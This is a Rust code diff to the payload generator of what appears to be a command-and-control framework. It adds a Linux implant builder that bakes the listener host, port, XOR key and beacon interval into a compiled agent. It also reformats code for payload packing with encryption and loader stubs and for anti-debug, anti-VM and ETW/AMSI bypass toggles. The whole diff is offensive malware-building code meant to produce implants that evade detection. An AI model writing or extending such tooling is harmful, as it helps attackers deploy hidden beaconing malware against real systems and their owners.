@@ -123,14 +123,109 @@ impl AgentHandler {
                 config,
                 database,
             ),
+            "linux" => {
+                self.generate_linux_payload_with_config(agent_id, listener_name, config, database)
+            }
             _ => Err(format!("Unsupported payload type: {}", payload_type)),
         }?;
 
         if config.enable_packing && payload_type != "shellcode" {
-            return Self::pack_payload(agent_id, &payload, &config.packer_encryption, &config.packer_loader);
+            return Self::pack_payload(
+                agent_id,
+                &payload,
+                &config.packer_encryption,
+                &config.packer_loader,
+            );
         }
 
         Ok(payload)
+    }
+
+    fn generate_linux_payload_with_config(
+        &self,
+        _agent_id: &str,
+        listener_name: &str,
+        config: &AgentConfig,
+        database: &Database,
+    ) -> Result<Vec<u8>, String> {
+        let listener = match database.get_listener(listener_name) {
+            Ok(Some(l)) => l,
+            Ok(None) => {
+                return Err(format!(
+                    "Listener '{}' not found in database",
+                    listener_name
+                ))
+            }
+            Err(e) => return Err(format!("Database error while checking listener: {}", e)),
+        };
+
+        let use_https = listener.listener_type.to_lowercase() == "https";
+        if listener.listener_type.to_lowercase() != "http" && !use_https {
+            return Err(format!(
+                "Only HTTP/HTTPS listener supported for Linux payload, got: {}",
+                listener.listener_type
+            ));
+        }
+
+        let header = listener
+            .http_headers
+            .iter()
+            .next()
+            .map(|(k, v)| format!("{}: {}", k, v))
+            .unwrap_or_else(|| "Accept: */*".to_string());
+
+        let cwd = env::current_dir().map_err(|e| format!("Cannot get current directory: {}", e))?;
+        let project_root = cwd
+            .parent()
+            .map(|p| p.to_path_buf())
+            .ok_or_else(|| format!("Cannot determine project root from: {}", cwd.display()))?;
+
+        let agent_dir = project_root.join("agents").join("linux");
+        if !agent_dir.exists() {
+            return Err(format!(
+                "Linux agent directory not found: {}",
+                agent_dir.display()
+            ));
+        }
+
+        log::info!(
+            "[+] Building Linux agent | listener={} | host={}:{} | https={}",
+            listener_name,
+            listener.host,
+            listener.port,
+            use_https
+        );
+
+        let output = Command::new("cargo")
+            .arg("build")
+            .arg("--release")
+            .current_dir(&agent_dir)
+            .env("XOR_KEY", &listener.xor_key)
+            .env("XOR_SERVER", &listener.host)
+            .env("XOR_PORT", listener.port.to_string())
+            .env("RESULTS_PATH", &listener.uri_paths)
+            .env("RESULT_PATH", "/api/result")
+            .env("USER_AGENT", &listener.user_agent)
+            .env("HEADER", &header)
+            .env("BEACON_INTERVAL", config.beacon_interval.to_string())
+            .env("USE_HTTPS", if use_https { "true" } else { "false" })
+            .output()
+            .map_err(|e| format!("Failed to spawn cargo build: {}", e))?;
+
+        if !output.status.success() {
+            let stderr = String::from_utf8_lossy(&output.stderr);
+            let stdout = String::from_utf8_lossy(&output.stdout);
+            return Err(format!("Linux agent build failed:\n{}\n{}", stdout, stderr));
+        }
+
+        let binary_path = agent_dir.join("target").join("release").join("agent");
+        fs::read(&binary_path).map_err(|e| {
+            format!(
+                "Failed to read compiled binary '{}': {}",
+                binary_path.display(),
+                e
+            )
+        })
     }
 
     fn pack_payload(
@@ -139,8 +234,7 @@ impl AgentHandler {
         encryption: &str,
         loader: &str,
     ) -> Result<Vec<u8>, String> {
-        let cwd = env::current_dir()
-            .map_err(|e| format!("Cannot get current directory: {}", e))?;
+        let cwd = env::current_dir().map_err(|e| format!("Cannot get current directory: {}", e))?;
         let project_root = cwd
             .parent()
             .map(|p| p.to_path_buf())
@@ -171,11 +265,10 @@ impl AgentHandler {
             ));
         }
 
-        let tmp_input  = format!("/tmp/xorc2_pack_in_{}.bin", agent_id);
+        let tmp_input = format!("/tmp/xorc2_pack_in_{}.bin", agent_id);
         let tmp_output = format!("/tmp/xorc2_pack_out_{}.bin", agent_id);
 
-        fs::write(&tmp_input, payload)
-            .map_err(|e| format!("Failed to write temp input: {}", e))?;
+        fs::write(&tmp_input, payload).map_err(|e| format!("Failed to write temp input: {}", e))?;
 
         let cmd = format!(
             "{packer} --input {input} --output {output} --stub {stub} --encryption {enc} --loader {loader}",
@@ -187,18 +280,21 @@ impl AgentHandler {
             loader = loader,
         );
 
-        log::info!("[*] Packing payload (enc={}, loader={})...", encryption, loader);
+        log::info!(
+            "[*] Packing payload (enc={}, loader={})...",
+            encryption,
+            loader
+        );
 
-        let result = Self::run_cmd(&cmd)
-            .map_err(|e| format!("Packer failed: {}", e));
+        let result = Self::run_cmd(&cmd).map_err(|e| format!("Packer failed: {}", e));
 
         // Nettoyer le fichier d'entrée temp dans tous les cas
         let _ = fs::remove_file(&tmp_input);
 
         result?;
 
-        let packed = fs::read(&tmp_output)
-            .map_err(|e| format!("Failed to read packed output: {}", e))?;
+        let packed =
+            fs::read(&tmp_output).map_err(|e| format!("Failed to read packed output: {}", e))?;
 
         let _ = fs::remove_file(&tmp_output);
 
@@ -338,9 +434,21 @@ impl AgentHandler {
             config.encrypt_memory_on_sleep
         );
 
-        let anti_debug_define = if config.anti_debug { "#define ANTI_DEBUG_ENABLED" } else { "// #define ANTI_DEBUG_ENABLED" };
-        let anti_vm_define = if config.anti_vm { "#define ANTI_VM_ENABLED" } else { "// #define ANTI_VM_ENABLED" };
-        let bypass_define = if config.bypass_etw_amsi { "#define BYPASS_ETW_AMSI" } else { "// #define BYPASS_ETW_AMSI" };
+        let anti_debug_define = if config.anti_debug {
+            "#define ANTI_DEBUG_ENABLED"
+        } else {
+            "// #define ANTI_DEBUG_ENABLED"
+        };
+        let anti_vm_define = if config.anti_vm {
+            "#define ANTI_VM_ENABLED"
+        } else {
+            "// #define ANTI_VM_ENABLED"
+        };
+        let bypass_define = if config.bypass_etw_amsi {
+            "#define BYPASS_ETW_AMSI"
+        } else {
+            "// #define BYPASS_ETW_AMSI"
+        };
 
         let new_agent_config = format!(
             r#"#pragma once
@@ -507,9 +615,21 @@ constexpr bool ENCRYPT_MEMORY_ON_SLEEP = {};
         );
         log::info!("    - USE_HTTPS: {}", use_https);
 
-        let anti_debug_define = if config.anti_debug { "#define ANTI_DEBUG_ENABLED" } else { "// #define ANTI_DEBUG_ENABLED" };
-        let anti_vm_define = if config.anti_vm { "#define ANTI_VM_ENABLED" } else { "// #define ANTI_VM_ENABLED" };
-        let bypass_define = if config.bypass_etw_amsi { "#define BYPASS_ETW_AMSI" } else { "// #define BYPASS_ETW_AMSI" };
+        let anti_debug_define = if config.anti_debug {
+            "#define ANTI_DEBUG_ENABLED"
+        } else {
+            "// #define ANTI_DEBUG_ENABLED"
+        };
+        let anti_vm_define = if config.anti_vm {
+            "#define ANTI_VM_ENABLED"
+        } else {
+            "// #define ANTI_VM_ENABLED"
+        };
+        let bypass_define = if config.bypass_etw_amsi {
+            "#define BYPASS_ETW_AMSI"
+        } else {
+            "// #define BYPASS_ETW_AMSI"
+        };
 
         let result_path = listener.uri_paths.replace("update", "result");
         let command_path = listener.uri_paths.replace("update", "command");
